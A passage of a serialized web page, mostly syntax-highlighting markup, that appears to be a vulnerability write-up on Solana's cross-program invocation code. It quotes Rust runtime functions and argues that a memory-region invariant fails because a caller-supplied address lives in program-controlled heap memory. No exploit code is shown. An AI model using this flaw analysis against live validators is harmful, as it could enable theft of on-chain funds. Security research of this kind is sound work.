token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement285\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement286\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement287\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segement288\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement289\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement291\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    callee_account\"]}],[\"$\",\"span\",\"code-segement292\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement293\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement294\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement295\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement296\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement297\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"BorrowedAccount\"]}],[\"$\",\"span\",\"code-segement298\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement299\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'_\"]}],[\"$\",\"span\",\"code-segement300\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement301\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement302\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[32]}],[\"$\",\"span\",\"code-segement304\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    direct_mapping\"]}],[\"$\",\"span\",\"code-segement305\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement306\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement307\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement308\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[33]}],[\"$\",\"span\",\"code-segement311\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement313\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement314\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement315\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement316\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}],[\"$\",\"span\",\"code-segement317\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement318\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement319\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement320\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement321\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement322\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}],[\"$\",\"span\",\"code-segement323\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement324\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement325\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement326\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[34]}],[\"$\",\"span\",\"code-segement328\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement329\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement330\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[35]}],\"\\n\",[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[36]}],[\"$\",\"span\",\"code-segement334\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement335\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement336\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" direct_mapping \"]}],[\"$\",\"span\",\"code-segement337\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement338\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" caller_account\"]}],[\"$\",\"span\",\"code-segement339\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement340\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"original_data_len \"]}],[\"$\",\"span\",\"code-segement341\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement342\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement343\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement344\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement345\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement346\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[37]}],[\"$\",\"span\",\"code-segement348\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement349\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement350\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[38]}],[\"$\",\"span\",\"code-segement352\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement353\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement354\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region \"]}],[\"$\",\"span\",\"code-segement355\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement356\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" memory_mapping\"]}],[\"$\",\"span\",\"code-segement357\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement358\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement359\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement360\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}],[\"$\",\"span\",\"code-segement361\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement362\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Load\"]}],[\"$\",\"span\",\"code-segement363\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement364\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" caller_account\"]}],[\"$\",\"span\",\"code-segement365\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement366\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_data_addr\"]}],[\"$\",\"span\",\"code-segement367\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement368\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement369\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement370\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[39]}],[\"$\",\"span\",\"code-segement372\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement373\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement374\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_ptr \"]}],[\"$\",\"span\",\"code-segement375\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement376\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}],[\"$\",\"span\",\"code-segement377\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement378\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_data\"]}],[\"$\",\"span\",\"code-segement379\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement381\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement382\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}],[\"$\",\"span\",\"code-segement383\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement384\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement385\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement386\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement387\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement388\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement389\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[40]}],[\"$\",\"span\",\"code-segement392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement393\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement394\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region\"]}],[\"$\",\"span\",\"code-segement395\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement396\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}],[\"$\",\"span\",\"code-segement397\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement398\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}],[\"$\",\"span\",\"code-segement399\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement400\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement401\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement402\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"!=\"]}],[\"$\",\"span\",\"code-segement403\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_ptr \"]}],[\"$\",\"span\",\"code-segement404\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement405\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[41]}],[\"$\",\"span\",\"code-segement407\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            region\"]}],[\"$\",\"span\",\"code-segement408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement409\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}],[\"$\",\"span\",\"code-segement410\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement411\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}],[\"$\",\"span\",\"code-segement412\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement413\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"callee_ptr\"]}],[\"$\",\"span\",\"code-segement414\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[42]}],[\"$\",\"span\",\"code-segement418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement419\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement420\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[43]}],[\"$\",\"span\",\"code-segement422\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement423\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-97\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The immediate question is, does the invariant of correct identification of \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" hold?\"]}],\"\\n\",[\"$\",\"p\",\"p-98\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The answer is no. Recall \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CallerAccount.vm_data_addr\"}],\" comes directly from \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo.data.as_ptr()\"}],\" in the VM's heap memory - memory that programs have complete control over.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-12\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"from_account_info\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    invoke_context\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InvokeContext\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    memory_mapping\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryMapping\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    is_loader_deprecated\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _vm_addr\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    account_info\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    original_data_len\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token 